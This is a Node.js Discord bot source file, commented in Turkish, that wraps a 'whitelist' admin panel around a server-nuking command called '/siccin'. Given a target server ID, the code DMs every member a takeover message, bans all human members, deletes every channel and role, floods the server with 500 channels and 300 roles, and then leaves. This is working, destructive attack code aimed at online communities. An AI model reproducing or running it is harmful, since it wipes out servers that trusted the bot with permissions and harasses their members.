require('dotenv').config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType
} = require('discord.js');

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ],
  partials: [Partials.Channel]
});

// ENV
const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// DATA
let cachedVideo = null;
let whitelist = {};
let whitelistMessageId = null;

// ================== BOT READY ==================
client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = { attachment: buffer, name: "video.mp4" };
    console.log("🎥 Video cachelendi");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

// ================== WHITELIST MESAJ ==================
async function updateWhitelistMessage(channel) {
  let description = "📜 **WHITELIST SUNUCULAR**\n\n";
  for (const id in whitelist) {
    description += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description });
  }

  const msg = await channel.send({ content: description });
  whitelistMessageId = msg.id;
}

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;

  return member.presence.activities.some(act =>
    act.type === ActivityType.Custom &&
    act.state &&
    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
  );
}

// ================== SICCCIN COMMAND ==================
async function siccinCommand(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
    return message.reply("❌ Bu komutu sadece OWNER veya SERI kullanabilir.");
  }

  const member = await message.guild.members.fetch(message.author.id);
  if (!hasSiccinStatus(member)) {
    return message.reply("❌ Durumunda `/siccin` veya `.gg/siccin` yok, kullanamazsın.");
  }

  const modal = new ModalBuilder()
    .setCustomId("siccinModal")
    .setTitle("ＳＩＣＣＩＮ Başlat");

  modal.addComponents(
    new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId("targetGuildID")
        .setLabel("Hedef Sunucu ID")
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
    )
  );

  return message.showModal(modal);
}

// ================== PANEL ==================
async function openPanel(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const embed = new EmbedBuilder()
    .setTitle("⚡ Vendetta Panel")
    .setDescription("Sistem seçiniz")
    .setColor("Grey");

  const selectRow = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
  );

  await message.reply({
    embeds: [embed],
    files: cachedVideo ? [cachedVideo] : [],
    components: [selectRow],
    ephemeral: true
  });
}

// ================== INTERACTIONS ==================
client.on("interactionCreate", async interaction => {

  // PANEL MENU
  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
    const embed = new EmbedBuilder()
      .setTitle("Whitelist Sistemi")
      .setDescription("Bir işlem seç")
      .setColor("Blue");

    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId("wlMenu")
        .addOptions([
          { label: "Whitelist Ekle", value: "wlEkle" },
          { label: "Whitelist Çıkar", value: "wlCikar" }
        ])
    );

    return interaction.update({ embeds: [embed], components: [row] });
  }

  // WL MENU
  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
    const modal = new ModalBuilder()
      .setCustomId(interaction.values[0])
      .setTitle("Whitelist İşlemi");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  // WL MODAL & SICCCIN MODAL
  if (interaction.isModalSubmit()) {
    const wlChannel = await client.channels.fetch(WL_KANAL_ID);

    // WHITELIST
    if (interaction.customId === "wlEkle") {
      const guildID = interaction.fields.getTextInputValue("guildID");
      const guild = client.guilds.cache.get(guildID);
      if (!guild) return interaction.reply({ content: "Sunucu bulunamadı", ephemeral: true });

      const owner = await guild.fetchOwner().catch(() => null);
      whitelist[guildID] = {
        name: guild.name,
        ownerTag: owner ? owner.user.tag : "Unknown"
      };

      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "✅ Whitelist eklendi", ephemeral: true });
    }

    if (interaction.customId === "wlCikar") {
      const guildID = interaction.fields.getTextInputValue("guildID");
      delete whitelist[guildID];
      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "🗑️ Whitelist çıkarıldı", ephemeral: true });
    }

    // SICCCIN MODAL
    if (interaction.customId === "siccinModal") {
      const guildId = interaction.fields.getTextInputValue("targetGuildID");
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil", ephemeral: true });
      if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });

      await interaction.reply({ content: "💣 ＳＩＣＣＩＮ İşlemi Başlatıldı", ephemeral: true });

      const ownerDM = await client.users.fetch(OWNER_ID).catch(() => null);
      const embedDM = new EmbedBuilder()
        .setColor("#8B0000")
        .setTitle("ＳＩＣＣＩＮ EJECTED")
        .setThumbnail(guild.iconURL({ dynamic: true }))
        .setDescription(`ＳＩＣＣＩＮ Tarafından **${guild.name}** Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\nhttps://discord.gg/siccin`);
      if (ownerDM) ownerDM.send({ embeds: [embedDM] }).catch(() => {});

      const members = await guild.members.fetch();
      const tasks = [];

      for (const m of members.values()) {
        if (m.user.bot) continue;
        tasks.push(m.send({ embeds: [embedDM] }).catch(() => {}));
        tasks.push(m.ban({ reason: "ＳＩＣＣＩＮ" }).catch(() => {}));
      }

      // Kanalları ve rolleri sil + 500 kanal 300 rol oluştur
      for (const c of guild.channels.cache.values()) tasks.push(c.delete().catch(() => {}));
      for (const r of guild.roles.cache.values()) tasks.push(r.delete().catch(() => {}));

      for (let i = 0; i < 500; i++) {
        tasks.push(guild.channels.create({ name: "ＳＩＣＣＩＮ 🔱" }).catch(() => {}));
      }
      for (let i = 0; i < 300; i++) {
        tasks.push(guild.roles.create({ name: "ＳＩＣＣＩＮ 🔱" }).catch(() => {}));
      }

      await Promise.all(tasks);
      await guild.leave().catch(() => {});
    }
  }
});

// ================== MESSAGE COMMANDS ==================
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;

  const cmd = message.content.toLowerCase();

  if (cmd === ".vndt") return openPanel(message);
  if (cmd === "/siccin") return siccinCommand(message);
});

client.login(BOT_TOKEN);
